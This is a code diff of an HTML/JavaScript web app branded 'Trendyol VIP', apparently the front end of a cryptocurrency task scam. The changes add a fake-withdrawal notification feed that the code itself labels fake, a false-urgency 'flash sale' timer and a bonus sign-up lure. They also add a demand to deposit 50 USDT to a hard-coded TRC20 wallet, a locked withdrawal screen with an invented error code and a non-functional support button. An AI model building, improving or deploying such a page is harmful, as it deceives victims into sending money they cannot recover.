@@ -3,43 +3,48 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Trendyol VIP - Secured System</title>
+    <title>Trendyol VIP - Global Partners</title>
     <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
     <style>
         :root { --primary: #f27a1a; --dark: #111; --gold: #c5a059; --green: #27ae60; --gray: #f4f7f6; }
-        body { font-family: 'Segoe UI', Tahoma, sans-serif; background: var(--gray); margin: 0; padding: 0; }
-        .header { background: var(--dark); color: white; padding: 40px 20px; text-align: center; border-bottom: 5px solid var(--primary); position: relative; }
+        body { font-family: 'Segoe UI', sans-serif; background: var(--gray); margin: 0; padding: 0; overflow-x: hidden; }
+        
+        /* شريط الاستعجال العلوي */
+        .promo-bar { background: #e74c3c; color: white; text-align: center; padding: 8px; font-size: 13px; font-weight: bold; }
+
+        .header { background: var(--dark); color: white; padding: 30px 20px; text-align: center; border-bottom: 5px solid var(--primary); position: relative; }
         .lang-btn { position: absolute; top: 15px; right: 15px; background: transparent; color: white; border: 1px solid white; padding: 5px 12px; border-radius: 20px; cursor: pointer; }
         .balance-val { font-size: 38px; font-weight: bold; color: var(--gold); }
+        
+        /* مستويات VIP */
+        .vip-badge { display: inline-block; background: var(--gold); color: black; padding: 2px 10px; border-radius: 10px; font-weight: bold; font-size: 12px; margin-top: 5px; }
+
         .action-btns { display: flex; gap: 10px; justify-content: center; margin-top: 20px; }
-        .btn-act { flex: 1; padding: 12px; border: none; border-radius: 10px; color: white; font-weight: bold; cursor: pointer; max-width: 140px; }
-        
-        .section-title { padding: 20px; font-weight: bold; color: #333; display: flex; justify-content: space-between; }
-        .task-list { padding: 0 15px 100px 15px; }
+        .btn-act { flex: 1; padding: 12px; border: none; border-radius: 10px; color: white; font-weight: bold; cursor: pointer; }
+
+        .task-list { padding: 15px 15px 100px 15px; }
         .task-card { background: white; border-radius: 15px; padding: 18px; margin-bottom: 15px; box-shadow: 0 4px 10px rgba(0,0,0,0.05); }
-        
         .task-header { display: flex; gap: 15px; align-items: center; margin-bottom: 12px; }
         .task-emoji-box { width: 60px; height: 60px; background: #fff1e6; border-radius: 12px; display: flex; align-items: center; justify-content: center; font-size: 30px; border: 1px solid #ffd8b8; }
-        
-        .task-info { flex: 1; }
-        .task-name { font-weight: bold; font-size: 14px; color: #222; }
-        .task-profit { color: var(--green); font-weight: bold; font-size: 15px; }
-
-        /* تفاصيل الشحن والعميل */
         .shipping-details { background: #fafafa; border-radius: 8px; padding: 10px; font-size: 11px; color: #777; border-left: 3px solid var(--primary); margin-bottom: 12px; }
-        [dir="rtl"] .shipping-details { border-left: none; border-right: 3px solid var(--primary); }
-        .detail-row { display: flex; justify-content: space-between; margin-bottom: 3px; }
-
         .btn-submit { background: var(--primary); color: white; border: none; width: 100%; padding: 12px; border-radius: 8px; cursor: pointer; font-weight: bold; }
 
-        .modal { display: none; position: fixed; inset: 0; background: rgba(0,0,0,0.8); z-index: 9999; align-items: center; justify-content: center; padding: 20px; }
+        /* الإشعارات الحية */
+        #notify-box { position: fixed; bottom: 20px; left: 50%; transform: translateX(-50%); background: rgba(0,0,0,0.8); color: white; padding: 10px 20px; border-radius: 30px; font-size: 12px; display: none; z-index: 10000; transition: 0.5s; white-space: nowrap; }
+
+        /* أيقونة الدعم */
+        .support-btn { position: fixed; bottom: 80px; right: 20px; background: var(--primary); width: 50px; height: 50px; border-radius: 50%; display: flex; align-items: center; justify-content: center; box-shadow: 0 4px 15px rgba(0,0,0,0.3); cursor: pointer; z-index: 999; }
+
+        .modal { display: none; position: fixed; inset: 0; background: rgba(0,0,0,0.8); z-index: 99999; align-items: center; justify-content: center; padding: 20px; }
         .modal-content { background: white; width: 100%; max-width: 350px; border-radius: 20px; padding: 25px; text-align: center; }
-        #auth-screen { position: fixed; inset: 0; background: white; z-index: 10000; display: flex; align-items: center; justify-content: center; }
+        #auth-screen { position: fixed; inset: 0; background: white; z-index: 100000; display: flex; align-items: center; justify-content: center; }
         .inp { width: 100%; padding: 14px; border: 1px solid #ddd; border-radius: 10px; margin-bottom: 10px; box-sizing: border-box; }
         .btn-main { width: 100%; padding: 15px; border: none; border-radius: 10px; background: var(--primary); color: white; font-weight: bold; cursor: pointer; }
     </style>
 </head>
 <body>
+
+    <div id="notify-box"></div>
 
     <div id="auth-screen">
         <div style="width: 100%; max-width: 300px; text-align: center;">
@@ -47,22 +52,29 @@
             <input type="email" id="email" class="inp" placeholder="Email Address">
             <input type="password" id="password" class="inp" placeholder="Password">
             <button class="btn-main" onclick="handleAuth('login')">Login</button>
-            <p style="color: #888; font-size: 13px; cursor: pointer;" onclick="handleAuth('signup')">Create New Account</p>
+            <p style="color: #888; font-size: 13px; cursor: pointer;" onclick="handleAuth('signup')">Sign Up for <b>Free $10 Bonus</b></p>
         </div>
     </div>
 
     <div id="main-app" style="display:none;">
+        <div class="promo-bar" id="promo-timer">FLASH SALE: VIP1 UPGRADE EXPIRES IN 02:00:00</div>
+        
         <div class="header">
             <button class="lang-btn" onclick="toggleLang()" id="lang-btn">العربية</button>
             <div id="txt-bal-title">Total Balance (USDT)</div>
             <div class="balance-val">$ <span id="balance">0.00</span></div>
+            <div class="vip-badge" id="vip-level">FREE TIER</div>
             <div class="action-btns">
                 <button class="btn-act" style="background:var(--green);" onclick="openModal('deposit')">Deposit</button>
                 <button class="btn-act" style="background:#e74c3c;" onclick="openModal('withdraw')">Withdraw</button>
             </div>
         </div>
-        <div class="section-title"><span id="txt-tasks">Order Center</span><span id="task-count" style="color: var(--primary);">0/10</span></div>
-        <div id="tasks-container" class="task-list"></div>
+
+        <div class="task-list" id="tasks-container"></div>
+    </div>
+
+    <div class="support-btn" onclick="alert('Support is busy. Please try again later.')">
+        <svg style="width:25px; fill:white" viewBox="0 0 24 24"><path d="M12,2A10,10 0 0,0 2,12C2,17.5 6.5,22 12,22C17.5,22 22,17.5 22,12A10,10 0 0,0 12,2M12,20C7.59,20 4,16.41 4,12C4,7.59 7.59,4 12,4C16.41,4 20,7.59 20,12C20,16.41 16.41,20 12,20M15,10A3,3 0 0,1 12,13A3,3 0 0,1 9,10A3,3 0 0,1 12,7A3,3 0 0,1 15,10Z"/></svg>
     </div>
 
     <div id="modal" class="modal">
@@ -81,25 +93,22 @@
 
     let currentLang = 'en', userData = {}, currentUser = null;
 
-    // مصفوفة الطلبات مع الأسماء والمواقع الوهمية
     const products = [
         { name: "Apple iPhone 15 Pro", profit: 4.44, emoji: "📱", customer: "M. Al-Otaibi", location: "Riyadh, KSA", orderId: "TR-99281" },
-        { name: "Samsung Galaxy Tab S9", profit: 4.44, emoji: "💻", customer: "John D.", location: "Dubai, UAE", orderId: "TR-77210" },
-        { name: "Sony XM5 Headphones", profit: 4.44, emoji: "🎧", customer: "Sarah K.", location: "London, UK", orderId: "TR-66192" },
-        { name: "Dyson V15 Vacuum", profit: 4.44, emoji: "🧹", customer: "A. Müller", location: "Berlin, DE", orderId: "TR-55401" },
-        { name: "Apple Watch Ultra 2", profit: 4.44, emoji: "⌚", customer: "H. Tanaka", location: "Tokyo, JP", orderId: "TR-44283" }
+        { name: "Samsung Galaxy Tab S9", profit: 6.50, emoji: "💻", customer: "John D.", location: "Dubai, UAE", orderId: "TR-77210" },
+        { name: "Sony XM5 Headphones", profit: 3.20, emoji: "🎧", customer: "Sarah K.", location: "London, UK", orderId: "TR-66192" }
     ];
 
     async function handleAuth(type) {
         const email = document.getElementById('email').value, password = document.getElementById('password').value;
         const { data, error } = type === 'signup' ? await _supabase.auth.signUp({ email, password }) : await _supabase.auth.signInWithPassword({ email, password });
-        if (error) alert(error.message); else if (type === 'login') loadData(data.user); else alert("Success! Now login.");
+        if (error) alert(error.message); else if (type === 'login') loadData(data.user); else alert("Account Created! Use login button.");
     }
 
     async function loadData(user) {
         currentUser = user;
         const { data } = await _supabase.from('profiles').select('*').eq('id', user.id).single();
-        if (data) { userData = data; document.getElementById('auth-screen').style.display = 'none'; document.getElementById('main-app').style.display = 'block'; updateUI(); }
+        if (data) { userData = data; document.getElementById('auth-screen').style.display = 'none'; document.getElementById('main-app').style.display = 'block'; updateUI(); startFakeNotify(); startTimer(); }
         else { setTimeout(() => loadData(user), 2000); }
     }
 
@@ -112,9 +121,8 @@
 
     function updateUI() {
         document.getElementById('balance').innerText = userData.balance.toFixed(2);
-        document.getElementById('task-count').innerText = `${userData.tasks_completed}/10`;
+        document.getElementById('vip-level').innerText = userData.is_vip ? "VIP 1 ACTIVE" : "FREE TIER";
         document.getElementById('txt-bal-title').innerText = currentLang === 'en' ? 'Total Balance (USDT)' : 'إجمالي الرصيد (USDT)';
-        document.getElementById('txt-tasks').innerText = currentLang === 'en' ? 'Order Center' : 'مركز الطلبات';
         
         const container = document.getElementById('tasks-container');
         container.innerHTML = '';
@@ -129,11 +137,10 @@
                         </div>
                     </div>
                     <div class="shipping-details">
-                        <div class="detail-row"><span>Customer:</span> <b>${p.customer}</b></div>
-                        <div class="detail-row"><span>Location:</span> <b>${p.location}</b></div>
-                        <div class="detail-row"><span>Order ID:</span> <b>${p.orderId}</b></div>
+                        <div>Customer: <b>${p.customer}</b></div>
+                        <div>Location: <b>${p.location}</b></div>
                     </div>
-                    <button class="btn-submit" onclick="submitTask()">${currentLang === 'en' ? 'Submit Order' : 'تأكيد الطلب'}</button>
+                    <button class="btn-submit" onclick="submitTask()">${currentLang === 'en' ? 'Grab Order' : 'اقتنص الطلب'}</button>
                 </div>`;
         });
     }
@@ -144,17 +151,41 @@
         document.getElementById('modal').style.display = 'flex';
         const extra = document.getElementById('m-extra');
         if (type === 'deposit') {
-            document.getElementById('m-title').innerText = currentLang === 'en' ? "Upgrade to VIP" : "ترقية إلى VIP";
-            document.getElementById('m-desc').innerText = currentLang === 'en' ? "Please deposit to your TRC20 address to unlock commissions:" : "يرجى الإيداع في عنوان TRC20 الخاص بك لفتح العمولات:";
+            document.getElementById('m-title').innerText = currentLang === 'en' ? "VIP Upgrade Required" : "مطلوب ترقية VIP";
+            document.getElementById('m-desc').innerText = currentLang === 'en' ? "To grab high-profit orders, deposit 50 USDT to:" : "لاقتناص أرباح عالية، قم بإيداع 50 USDT في:";
             extra.innerText = "TG9gT1pPJK3aETRp1hVu28F5Zayu4oVyEg";
         } else {
-            document.getElementById('m-title').innerText = currentLang === 'en' ? "Withdrawal" : "سحب الرصيد";
-            document.getElementById('m-desc').innerText = currentLang === 'en' ? "Minimum 10 tasks must be completed." : "يجب إكمال 10 مهام على الأقل.";
-            extra.innerText = "Current Status: Restricted";
+            document.getElementById('m-title').innerText = currentLang === 'en' ? "Withdrawal Locked" : "السحب مقفل";
+            document.getElementById('m-desc').innerText = currentLang === 'en' ? "Account verification needed. Complete 10 tasks." : "يجب توثيق الحساب. أكمل 10 مهام أولاً.";
+            extra.innerText = "Error Code: 0x992";
         }
     }
 
     function closeModal() { document.getElementById('modal').style.display = 'none'; }
+
+    // نظام الإشعارات الوهمية
+    function startFakeNotify() {
+        const names = ["User 492", "Ali_99", "Sara.H", "K. Ahmed", "User 102", "M_Vip"];
+        const amounts = [120, 450, 30, 1000, 215, 60];
+        setInterval(() => {
+            const n = names[Math.floor(Math.random()*names.length)];
+            const a = amounts[Math.floor(Math.random()*amounts.length)];
+            const box = document.getElementById('notify-box');
+            box.innerText = `🔥 ${n} just withdrawn ${a}.00 USDT!`;
+            box.style.display = 'block';
+            setTimeout(() => box.style.display = 'none', 4000);
+        }, 12000);
+    }
+
+    // عداد الوقت
+    function startTimer() {
+        let sec = 7200;
+        setInterval(() => {
+            sec--;
+            let h = Math.floor(sec/3600), m = Math.floor((sec%3600)/60), s = sec%60;
+            document.getElementById('promo-timer').innerText = `FLASH SALE: VIP1 UPGRADE EXPIRES IN 0${h}:${m < 10 ? '0'+m : m}:${s < 10 ? '0'+s : s}`;
+        }, 1000);
+    }
 </script>
 </body>
 </html>
